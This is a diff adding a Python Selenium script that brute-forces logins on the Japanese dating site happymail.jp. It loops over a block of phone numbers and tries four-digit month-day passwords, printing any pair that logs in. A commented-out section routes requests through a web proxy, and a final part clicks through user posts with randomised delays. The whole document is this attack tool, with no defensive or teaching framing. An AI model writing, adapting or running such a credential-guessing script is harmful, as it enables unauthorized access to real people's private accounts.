@@ -1,0 +1,54 @@
+from selenium import webdriver
+import time
+from selenium.webdriver.common.keys import Keys
+import random
+
+driver = webdriver.Chrome("/Users/tatsumiryou/Downloads/chromedriver-9")
+"""
+driver.get("https://www.4everproxy.com/")
+
+asa = driver.find_element_by_xpath('//*[@id="content"]/section[1]/div[1]/div[2]/div/div/form/div[1]/input[1]')
+
+asa.send_keys("https://happymail.jp/login/")
+
+driver.find_element_by_xpath('//*[@id="content"]/section[1]/div[1]/div[2]/div/div/form/div[1]/button').click()
+
+"""
+driver.get('https://happymail.jp/login/')
+time.sleep(3)
+
+for j in range(2,10000):
+    print(j)
+    for month in range(12):
+        for day in range(31):
+            #time.sleep(0.1)
+            driver.refresh()
+            month = str(month).zfill(2)
+            day = str(day).zfill(2)
+            tel = driver.find_element_by_id("TelNo")
+            j = str(j).zfill(4)
+            telnum = f"0807893{j}"
+            #print(telnum)
+            tel.send_keys(telnum)
+
+            passw = month + day
+            key = driver.find_element_by_id("TelPass")
+            key.send_keys(passw)
+            #print(passw)
+            driver.find_element_by_id("login_btn").click()
+
+            if driver.find_elements_by_class_name("ds_top_menu_list"):
+                print(telnum,passw)
+            driver.back()
+
+
+driver.find_elements_by_class_name("ds_top_menu_list")[4].click()
+
+per = driver.find_elements_by_class_name("ds_user_post_link_item_r")[0]
+per.click()
+
+for i in range(400):
+    ran = random.randint(5,30)
+    next = driver.find_element_by_class_name("swiper-button-next")
+    next.click()
+    time.sleep(ran/5)
